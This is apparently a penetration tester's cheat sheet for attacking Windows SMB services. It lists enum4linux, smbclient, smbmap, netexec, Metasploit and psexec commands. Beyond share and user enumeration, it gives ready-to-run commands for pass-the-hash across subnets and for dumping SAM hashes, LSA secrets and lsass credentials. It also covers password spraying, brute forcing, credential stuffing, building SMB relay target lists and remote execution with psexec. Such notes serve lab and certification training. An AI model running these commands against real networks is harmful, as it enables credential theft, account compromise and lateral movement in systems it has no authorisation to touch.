# 139/445 SMB
## enum4linux
https://github.com/cddmp/enum4linux-ng
```bash
enum4linux -a $ip

enum4linux $ip$ -u Tester -p 'Start123!' -oY out
```
## SMB Client
```bash
# List Shares
smbclient -L \\\\$ip\\

mget *

# Anonymously
smbclient //$ip/share -N
# Authenticated
smbclient //$ip/share -U <username>
# Protocol Error?
smbclient //$ip/share -N --option='client min protocol=NT1'
# Dump entire share to terminal
smbclient //ip/share -N -c 'recurse; ls'
```
## SMBMap
```bash
# Anonymous Enumeration of Shares
smbmap -H 10.129.14.128

# Enumerate Shares
smbmap -u  -p  -d domain -H domain
```
## netexec
https://www.netexec.wiki/

```bash
# General help
netexec --help

# Protocol help
netexec smb --help

# Generate Hosts File
netexec smb 192.168.X.0/24 --generate-hosts-file hosts_file

# Connections & SprayingÂ 
# Target format
netexec smb ms.evilcorp.org
netexec smb 192.168.1.0 192.168.0.2
netexec smb 192.168.1.0-28 10.0.0.1-67
netexec smb 192.168.1.0/24
netexec smb targets.txt

# Null Authentication
netexec smb 10.129.14.128 -u '' -p ''
# Guest Authentication
netexec smb 10.129.169.154 -u mav -p ''

# Connect to target using local account
netexec smb 192.168.215.138 -u 'Administrator' -p 'PASSWORD' --local-auth

# Pass the hash against a subnet
netexec smb 172.16.157.0/24 -u administrator -H 'LMHASH:NTHASH' --local-auth
# Dump SAM hashes using methods from secretsdump.py
netexec smb 172.16.157.0/24 -u administrator -H 'LMHASH:NTHASH' --local-auth --sam
# Dump LSA secrets using methods from secretsdump.py
netexec smb 172.16.157.0/24 -u administrator -H 'LMHASH:NTHASH' --local-auth --lsa
# Dump the recent user hashes stored in lsass 
netexec smb 172.16.157.0/24 -u administrator -H 'LMHASH:NTHASH' --local-auth -M lsassy
netexec smb 172.16.157.0/24 -u administrator -H 'NTHASH'

# Bruteforcing and Password Spraying
netexec smb 192.168.100.0 -u "admin" -p "password1" --continue-on-success
netexec smb 192.168.100.0 -u "admin" -p "password1" "password2" --continue-on-success
netexec smb 192.168.100.0 -u "admin1" "admin2" -p "Password" --continue-on-success

# Credential Stuffing
netexec smb 192.168.100.0 -u users.txt -p users.txt --continue-on-success
netexec smb 192.168.100.0 -u users.txt -p passwords.txt --continue-on-success
netexec smb 192.168.100.0 -u users.txt -H ntlm_hashes.txt --continue-on-success
```

### Enumeration
#### Users
```bash
# Enumerate users | Also pulls AD description!
netexec smb 192.168.215.104 -u 'user' -p 'PASS' --users

# Perform RID Bruteforce to get users
netexec smb 192.168.215.104 -u 'user' -p 'PASS' --rid-brute

# Enumerate domain groups
netexec smb 192.168.215.104 -u 'user' -p 'PASS' --groups

# Enumerate local users
netexec smb 192.168.215.104 -u 'user' -p 'PASS' --local-users
```
#### Hosts
```bash
# Generate a list of relayable hosts (SMB Signing disabled)
netexec smb 192.168.1.0/24 --gen-relay-list output.txt

# Enumerate available shares
netexec smb 192.168.215.138 -u 'user' -p 'PASSWORD' --local-auth --shares

# Get the active sessions
netexec smb 192.168.215.104 -u 'user' -p 'PASS' --sessions

# Check logged in users
netexec smb 192.168.215.104 -u 'user' -p 'PASS' --lusers
# Check for PrintNightmare
netexec smb 192.168.215.104 -u 'user' -p 'PASS' -M Spooler
# Get the password policy (Useful to pull account lockout threshold)
netexec smb 192.168.215.104 -u 'user' -p 'PASS' --pass-pol
```
#### Shares
```bash
netexec smb 192.168.215.138 -u '' -p '' --shares
```
### MSF Console
```bash
search smb

# Versions
use auxiliary/scanner/smb/smb_version
```

### psexec
```bash
psexec.py 'north.sevenkingdoms.local\jon.snow':iknownothing@10.13.37.22
```
smbexec
winexe